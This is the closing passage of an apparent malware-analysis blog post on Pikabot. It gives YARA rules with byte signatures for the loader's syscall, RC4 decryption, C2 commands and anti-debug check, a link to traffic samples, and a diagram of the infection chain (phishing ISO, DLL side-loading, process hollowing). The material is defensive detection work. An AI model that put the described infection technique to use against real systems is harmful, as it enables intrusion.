</span></span><span class="line"><span class="cl">    	<span class="n">created</span>     <span class="o">=</span> <span class="s">&#34;2024-04-19&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nl">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">NtCreateUserProcess_syscall</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">68</span> <span class="mi">2</span><span class="n">C</span> <span class="n">B1</span> <span class="n">AC</span> <span class="mi">82</span> <span class="n">E8</span> <span class="mf">5F</span> <span class="n">FF</span> <span class="n">FF</span> <span class="n">FF</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="err">$</span><span class="n">rc4_decrypt_core</span> <span class="o">=</span> <span class="p">{</span><span class="n">F7</span> <span class="n">FF</span> <span class="mi">8</span><span class="n">A</span> <span class="mi">84</span> <span class="mi">15</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mi">89</span> <span class="n">D1</span> <span class="mi">8</span><span class="n">A</span> <span class="mi">94</span> <span class="mi">1</span><span class="n">D</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mi">88</span> <span class="mi">94</span> <span class="mi">0</span><span class="n">D</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mi">8</span><span class="n">B</span> <span class="mi">55</span> <span class="mi">08</span> <span class="mi">88</span> <span class="mi">84</span> <span class="mi">1</span><span class="n">D</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mo">02</span> <span class="mi">84</span> <span class="mi">0</span><span class="n">D</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mf">0F</span> <span class="n">B6</span> <span class="n">C0</span> <span class="mi">8</span><span class="n">A</span> <span class="mi">84</span> <span class="mo">05</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mi">32</span> <span class="mo">04</span> <span class="mi">32</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nl">condition</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    	<span class="mi">1</span> <span class="n">of</span> <span class="n">them</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">Pikabot_core</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nl">meta</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    	<span class="n">author</span>      <span class="o">=</span> <span class="s">&#34;Cr4CK3d&#34;</span>
</span></span><span class="line"><span class="cl">    	<span class="n">description</span> <span class="o">=</span> <span class="s">&#34;Detect Pikabot core&#34;</span>
</span></span><span class="line"><span class="cl">    	<span class="n">created</span>     <span class="o">=</span> <span class="s">&#34;2024-04-19&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nl">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    	<span class="err">$</span><span class="n">c2_commands</span> <span class="o">=</span> <span class="p">{</span> <span class="mf">6F</span> <span class="mi">24</span> <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="n">CB</span> <span class="mi">0</span><span class="n">A</span> <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="mi">6</span><span class="n">C</span> <span class="mo">03</span> <span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="mi">92</span> <span class="mo">07</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    	<span class="err">$</span><span class="n">debug_check</span> <span class="o">=</span> <span class="p">{</span> <span class="n">E8</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="o">??</span> <span class="mi">3</span><span class="n">D</span> <span class="mo">00</span> <span class="mi">25</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mi">75</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nl">condition</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    	<span class="mi">1</span> <span class="n">of</span> <span class="n">them</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="downloads">Downloads</h2>
<ul>
<li><a href="https://www.malware-traffic-analysis.net/2024/03/06/index.html" target="_blank" rel="noopener noreffer ">malware-traffic-analysis</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-04-13</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/2024/04/pikabot/" data-title="Pikabot Analysis"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/2024/04/pikabot/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/2024/04/pikabot/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/2024/04/pikabot/" data-title="Pikabot Analysis"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/2024/04/pikabot/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/2024/04/pikabot/" data-title="Pikabot Analysis"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/2024/04/pikabot/" data-title="Pikabot Analysis" data-image="/images/pikabot.jpeg"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.124.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://cr4ck3d.github.io" target="_blank">cr4ck3d</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/twemoji/twemoji.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/mermaid/mermaid.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"  graph TD\n\t0(\"Phishing Email with Attached ISO image\")\n\t1(\"copy of write.exe side-loads malicious DLL named edputil.dll\")\n\t2(\"side-loaded DLL retrieves and runs Pikabot Loader\")\n\t3(\"Pikabot Loader decrypt and inject Core Module\")\n    4(\"ctfmon.exe (Pikabot Core Module)\")\n\t 0 --\u003e | victim runs the executable | 1\n\t 1 --\u003e |  | 2\n\t 2 --\u003e |  | 3\n     3 --\u003e | create | 4\n     3 --\u003e | process hollowing | 4","id-2":"Cr4CK3DD","id-3":"Cr4CK3DD"},"lightgallery":true,"search":{"algoliaAppID":"","algoliaIndex":"","algoliaSearchKey":"","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-2":["id-2"],"id-3":["id-3"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
